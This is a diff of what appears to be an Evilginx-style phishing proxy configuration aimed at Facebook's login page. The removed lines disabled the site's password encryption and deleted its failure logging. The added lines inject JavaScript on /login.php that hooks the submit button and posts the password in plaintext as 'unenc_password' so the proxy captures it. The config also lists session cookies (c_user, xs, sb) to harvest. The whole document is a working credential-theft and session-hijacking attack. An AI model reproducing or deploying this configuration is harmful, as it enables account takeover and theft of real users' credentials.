@@ -14,21 +14,6 @@ sub_filters:
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 
-# This will fail the encryption of password and will leak the password in post request..
-# Replace This    scry(a,'input[id="pass"]')   to     scry(a,'input[id="null"]')
-
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'input[id="pass"]', replace: 'input[id="null"]', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'input[id="pass"]', replace: 'input[id="null"]', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'input[id="pass"]', replace: 'input[id="null"]', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-
-# This will remove the server side logging of the failed encryption of password 
-# Remove This From js
-# BrowserEncryptionFailureInLoginFormControllerWWW
-
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'BrowserEncryptionFailureInLoginFormControllerWWW', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'inputBrowserEncryptionFailureInLoginFormControllerWWW', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'BrowserEncryptionFailureInLoginFormControllerWWW', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
@@ -38,20 +23,9 @@ credentials:
     search: '(.*)'
     type: 'post'
   password:
-    key: 'pass'
+    key: 'unenc_password'
     search: '(.*)'
     type: 'post'
-  custom:
-    - key: 'pass'
-      search: '(.*)'
-      type: 'post'
-    - key: 'pass'
-      search: '(.*)'
-      type: 'post'
-    - key: 'pass'
-      search: '(.*)'
-      type: 'post'
-
 
 
    
@@ -59,6 +33,27 @@ login:
   domain: 'www.facebook.com'
   path: '/login.php'
 
+js_inject:
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login.php"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("pass")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login/device-based/regular/login/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+      
+      
 # The js Function Responsible For Password Encryption is Present in this js file Located At : https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/yEB-M5_vVi6.js?_nc_x=Ij3Wp8lg5Kz
 #
 # _encryptBeforeSending: function (a) {
